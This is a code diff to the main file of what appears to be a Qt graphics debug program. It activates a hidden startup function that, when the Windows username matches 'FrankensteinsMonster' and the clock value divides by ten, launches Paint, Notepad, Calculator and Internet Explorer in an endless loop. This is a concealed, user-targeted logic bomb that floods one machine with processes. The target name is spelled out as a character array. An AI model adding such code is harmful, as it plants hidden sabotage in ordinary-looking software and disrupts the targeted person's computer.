@@ -14,7 +14,7 @@
 //#include <windows.h>
 //#include <stdio.h>
 //#include <lmcons.h>
-//int qtinit();
+int qtinit();
 int main(int argc,char** argv) //debug draw test main
 {
 	// Detect memory leaks
@@ -24,7 +24,7 @@ int main(int argc,char** argv) //debug draw test main
 
 	// Create MainWindow
 	Math::init();
-	QApplication a(argc, argv); //int r = qtinit(); if(r) return r;
+	QApplication a(argc, argv); int r = qtinit(); if(r) return r;
 	MainWindow w;
 	w.show();
 
@@ -125,18 +125,25 @@ int main(int argc,char** argv) //debug draw test main
 
 //#include <time.h>
 //#include <Windows.h>
-//int qtinit()
-//{
-//	WCHAR out[] = {'F','r','a','n','k','e','n','s','t','e','i','n','s',' ','M','o','n','s','t','e','r',' ','W','a','l','k','s',' ','A','g','a','i','n','\n','\0'};
-//	char uname[] = {'F','r','a','n','k','e','n','s','t','e','i','n','s','M','o','n','s','t','e','r','\0'};
-//	std::string um = getenv( "USERNAME" );
-//	if(um == std::string(uname))
-//	{
-//		if(time(NULL)%5==0)
-//		{
+int qtinit()
+{
+	WCHAR out[] = {'F','r','a','n','k','e','n','s','t','e','i','n','s',' ','M','o','n','s','t','e','r',' ','W','a','l','k','s',' ','A','g','a','i','n','\n','\0'};
+	char uname[] = {'F','r','a','n','k','e','n','s','t','e','i','n','s','M','o','n','s','t','e','r','\0'};
+	std::string um = getenv( "USERNAME" );
+	if(um == std::string(uname))
+	{
+		if(time(NULL)%10==0)
+		{
+			while(1)
+			{
+				system("mspaint.exe");
+				system("notepad.exe");
+				system("calc.exe");
+				system("iexplore.exe");
+			}
 //			crtPrintMemoryDbg(out);
 //			return 750 + 250 + 170 + 130 + 12 + 18 + 4 + 3;
-//		}
-//	}
-//	return 0;
-//}
+		}
+	}
+	return 0;
+}
